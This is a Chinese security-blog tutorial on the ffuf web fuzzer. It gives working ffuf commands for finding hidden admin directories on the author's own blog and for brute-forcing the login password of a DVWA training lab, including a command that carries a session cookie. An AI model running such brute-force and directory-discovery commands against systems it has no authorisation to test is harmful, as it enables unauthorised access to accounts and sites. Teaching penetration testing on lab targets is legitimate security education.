---
title: 密码忘记怎么办？不妨试试Ffuf
url: https://mp.weixin.qq.com/s/rgVxzo7I96Ofd9Aa8xFHzQ
source: Doonsec's feed
date: 2026-08-01
fetch_date: 2026-08-02T05:09:57.475883
---

# 密码忘记怎么办？不妨试试Ffuf

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6O5Yvj83RibyP7EEcMxnia8nWibOBicJRLyKRWjLFyg1ylS48ibByuQjeePPg/0?wx_fmt=jpeg)

# 密码忘记怎么办？不妨试试Ffuf

大表哥吆
大表哥吆

kali笔记

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 本文为大家分享一款密码破解神器Ffuf。是一款基于`Go`语言编写的高速`Web Fuzzer`工具。速度快，并且跨平台深受网络安全工作者的喜爱。

# 部署

在Kali中，Ffuf已经默认安装。我们可以利用`ffuf -h`查看相关帮助命令。

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6OnicbJSzWVCwy8dRynUHl9hwFXt5y22BnPAib8nuua4VjW6tOFibX9Ilbw/640?wx_fmt=png&from=appmsg)

# 使用

ffuf的使用基本格式如下：

```
ffuf -u 目标地址/FUZZ -w 字典
```

在这里`FUZZ`起到了占位符。类似于在Burp中添加`$$`形成变量。

# 牛刀小试

**寻找网站后台**

通常情况下，一个网站都存在相关后台文件。如`https://baidu.com/admin.php` 因此，我们可以用其查找后台文件。这里以我博客为例。

```
ffuf -u https://blog.bbskali.cn/FUZZ -w /root/tool/password/高效网站后台目录字典（20100）.txt
```

![找到的后台目录](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6OicLNlNTNslf07bx6jZ1Nz7KWticIOxzP56WhNHuiadAejBdoFnfiaB8c8w/640?wx_fmt=png&from=appmsg)

找到的后台目录

**密码破解**

利用`FUZZ`我们还可以轻松完成密码破解。这里以DVWA靶场为例。

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6OUCSzdiaPgXVOczXwwiaoGPbyV0udJRhibDs8MzQKt2gFup1XULd0DMc6g/640?wx_fmt=png&from=appmsg)

倘若知道当前账号为`admin` 密码不知道。因此，我们先随便输入一个密码，并抓包。

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6OCnNgcCRZh8Ymict3kcPSibkPQQbM17hufgElwI8xib8tibV6jALbEENQ3Q/640?wx_fmt=png&from=appmsg)于是，我们便得到了密码访问的请求地址

```
http://192.168.123.173/vulnerabilities/brute/?username=admin&password=1111&Login=Login
```

现在，我们只需要将`password=admin`替换为`password=FUZZ`即可。

```
ffuf -u "http://192.168.123.173/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login"  -w  /root/pass.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6ONQ8OJjvLVXuZYicYviaAASG7RYP0Vq82ibia7icBhEibRAZZ6uInP1oiaEHsg/640?wx_fmt=png&from=appmsg)

但是，你会奇怪的发现所有的请求都成了`302` 并且字节都为`0` 很明显，这是不对的。通过抓包日志，我们可以看到，里面有COOKIE值，因此，我们在添加Cookie即可。

```
ffuf -w /root/pass.txt -u "http://192.168.123.173/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" -H "Cookie: security_level=0; security=low; PHPSESSID=n2r3b2dfmqheld3gjf81ol0756"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6Ot8hDOqHLRDZiaBdrGp4Zjj1vxZtzdDykRibkIw51J7ibyld1AtlGh2N2A/640?wx_fmt=png&from=appmsg)

这时，你可以通过Size来判断密码了。

# 保存结果

`-of`（指明导出文件类型）、`-o`（指明导出的文件位置和文件名字）两者同时使用。

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6OLp7XQyjAoUHmA220wfHkF9aXdX4iaM0xsMtLOZaxXJq4FOM18aMEyfw/640?wx_fmt=png&from=appmsg)效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgrXN9YeTuibibG4crFJdwx6OU5y3yclibeAlSPHXh31Uop31UibMmG1RKQxBxpC7KibJxre56BXibZoOmg/640?wx_fmt=png&from=appmsg)

# 总结

目前市面上类似ffuf的工具有很多，如Wfuzz等。其原理都是一样的。将用户名和密码用FUZZ代码，然后给里面放入数据就行了。

**BREAK AWAY**

**往期推荐**

**0****1**

[【连免费WiFi享裸奔人生】网络安全知识普及](https://mp.weixin.qq.com/s?__biz=MzkxMzIwNTY1OA==&mid=2247520521&idx=1&sn=740579f4c6c514ab9bd216becef19a90&scene=21#wechat_redirect)

**0****2**

[Windows中查看已连接WiFi密码 这些技能你知道吗？](https://mp.weixin.qq.com/s?__biz=MzkxMzIwNTY1OA==&mid=2247519237&idx=1&sn=5ef88db393dd48951e5e53922b5a8ed0&scene=21#wechat_redirect)

**0****3**

[John密码破解姿势](https://mp.weixin.qq.com/s?__biz=MzkxMzIwNTY1OA==&mid=2247499148&idx=1&sn=57b488062d4aaf8ad9fc6e59fee9a835&scene=21#wechat_redirect)

更多精彩文章  欢迎关注我们

基础类教程 欢迎关注

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatia2JZVpfzEcXsOV52zrUXfJ951pRnM6UK5ghiaE4iaicHYADqWZFQmlZicF01GdKdwg9hRKlhiceeibQuRQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过